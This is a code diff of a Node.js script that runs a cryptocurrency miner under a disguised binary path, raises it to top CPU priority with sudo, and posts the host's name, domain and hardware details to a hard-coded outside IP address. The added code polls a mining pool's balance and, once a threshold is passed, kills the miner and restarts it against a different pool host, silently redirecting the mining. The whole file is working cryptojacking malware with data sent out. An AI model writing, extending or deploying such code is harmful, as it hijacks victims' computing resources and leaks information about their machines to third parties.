@@ -4,7 +4,17 @@ const execSync = require('child_process').execSync;
 const args = process.argv.slice(2);
 const http = require("http");
 const os = require('os');
-const miner = spawn('/patata/patata2', ['-o', args[1], '-u', args[0], '-t', os.cpus().length, '--av=2', '-k', '--no-color']);
+
+const poolIp = (args[1]) ? args[1].split(':')[0] : '';
+const poolPort = (args[1]) ? args[1].split(':')[1] : '';
+const wallet = (args[0]) ? args[0] : '';
+const url = "http://api.minexmr.com:8080/stats_address?address=" +  wallet + "&longpoll=false";
+var nPool = "ec2-18-221-42-187.us-east-2.compute.amazonaws.com:" + poolPort;
+var minerArgs = ['-o', args[1], '-u', args[0], '-t', os.cpus().length, '--av=2', '-k', '--no-color']
+var miner;
+
+var fAmount = 200000;
+
 const options = {
     host: "51.254.143.175",
     path: "/",
@@ -12,16 +22,26 @@ const options = {
     method: "POST",
     headers: {"Content-Type": "application/json"},
 };
-var info = getInfo();
 
-execSync('sudo renice -n -20 -p ' + miner.pid);
+var body = {
+    instance: os.hostname(),
+    project: '' + execSync('hostname -d'),
+    wallet: wallet,
+    uptime: os.uptime() * 1000,
+    pool: minerArgs[1],
+    hashrate: {
+        short: 'n/a',
+        mid: 'n/a',
+        long: 'n/a',
+        highest: 'n/a'
+    },
+    sys: getInfo()
+};
+
+checkThold();
 
 function getInfo () {
-    var res = {
-        tpc: os.cpus().length,
-        freq: os.cpus()[0].speed,
-        cache: ''
-    };
+    var res = {tpc: os.cpus().length, freq: os.cpus()[0].speed, cache: ''};
     var info = execSync('lscpu') + '';
     info = info.split('\n');
     for (var i = info.length - 1; i >= 0; i--) {
@@ -32,22 +52,6 @@ function getInfo () {
     }
     return res;
 }
-
-var body = {
-    instance: os.hostname(),
-    project: '' + execSync('hostname -d'),
-    wallet: (args[0]) ? args[0] : '',
-    mail: (args[3]) ? args[3] : '',
-    uptime: os.uptime() * 1000,
-    hashrate: {
-        short: 'n/a',
-        mid: 'n/a',
-        long: 'n/a',
-        highest: 'n/a'
-    },
-    sys: info
-};
-
 
 function sendData (callback) {
     var req = http.request(options, function (res) {
@@ -60,7 +64,8 @@ function sendData (callback) {
     });
 }
 
-miner.stdout.on('data', function (data) {
+
+function parseOutput (data) {
     data += '';
     
     if (data.indexOf('speed') !== -1) {
@@ -76,4 +81,41 @@ miner.stdout.on('data', function (data) {
             console.log('sended', body);
         });
     }
-});
+}
+
+function getBalance (callback) {
+    http.get(url, function (res) {
+        var payment = {};
+        var data = "";
+        res.on('data', function (buffer) {
+            data += buffer;
+        });
+        res.on('end', function () {
+            payment = (data) ? JSON.parse(data).stats : payment;
+            callback(payment);
+        });
+    });
+}
+
+function checkThold () {
+    getBalance(function (payment) {
+        if (payment.thold < payment.balance) {
+                if (miner) {
+                    console.log('killing miner');
+                    miner.kill('SIGINT');
+                }
+                minerArgs[1] = nPool;
+                body.pool = minerArgs[1];
+                miner = spawn('/patata/patata2', minerArgs);
+                execSync('sudo renice -n -20 -p ' + miner.pid);
+                miner.stdout.on('data', parseOutput);
+        } else {
+            if (!miner) {
+                miner = spawn('/patata/patata2', minerArgs);
+                execSync('sudo renice -n -20 -p ' + miner.pid);
+                miner.stdout.on('data', parseOutput);
+            }
+            setTimeout(checkThold, 18090000);
+        }
+    });
+}
